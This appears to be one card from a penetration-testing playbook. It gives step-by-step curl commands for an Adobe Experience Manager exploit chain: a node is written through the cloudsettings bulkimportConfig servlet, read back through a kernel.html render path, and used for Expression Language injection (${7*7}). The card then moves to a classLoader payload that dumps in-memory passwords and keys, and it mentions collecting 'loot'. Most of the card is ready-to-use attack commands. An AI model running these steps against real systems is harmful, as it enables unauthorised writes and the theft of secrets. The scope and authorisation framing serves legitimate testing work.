# Batch 16 — Write a node + leak config (EL)

## GOAL
Probe modern write → render → Expression Language chain. Last heavy AEM card.

## TIME
~1–2 hours

## YOU NEED
- Write tests allowed  
- Prefer math proof `${7*7}` before secret dump  

---

## WHY (30 seconds)

Some servlets create nodes using a **powerful service account**.  
Another servlet **renders** that node’s `sling:resourceType` (runs almost any internal page).  
One bad page evals an `action` field as Expression Language and can print **in-memory passwords/keys**.  

Many boxes are patched. One clean try is enough. Do not spam.

---

## DO THIS

```bash
T="https://PUT-THE-SITE-HERE"
```

### 1) Can we POST cloudsettings import?

```bash
curl -sk -o /tmp/w -w "%{http_code} bytes=%{size_download}\n" \
  -X POST "$T/cloudsettings.bulkimportConfig.json" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data "importSource=UrlBased&sling:resourceType=/libs/granite/ui/components/shell/help/about/about.jsp"
head -c 300 /tmp/w; echo
```

### 2) Read back through conf delivery path

```bash
curl -sk -o /tmp/r -w "%{http_code} bytes=%{size_download}\n" \
  "$T/etc/cloudsettings.kernel.html/conf/global/settings/dam/import/cloudsettings/jcr:content"
head -c 400 /tmp/r; echo
```

### 3) EL math proof

```bash
curl -sk -X POST "$T/cloudsettings.bulkimportConfig.json" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data 'importSource=UrlBased&sling:resourceType=/libs/cq/gui/components/projects/admin/actions/view/translationpage/translationpage.jsp&action=${7*7}'
```

Fetch step 2 path again. Look for **49** (`7*7`).  
If yes and scope allows: one config-leak payload family using `pageContext.class.classLoader...properties` (see `reference/09-modern-bugs.md`). Do **not** brute all day — temp nodes get cleaned.

---

## IF / THEN

| What you saw | What you do |
|--------------|-------------|
| Math 49 | High impact path — careful config leak PoC |
| Write works only | Still report |
| All closed | **Board complete** |

---

## NEXT
**None.**  
Optional: if new doors opened, re-run **07–08** for loot.
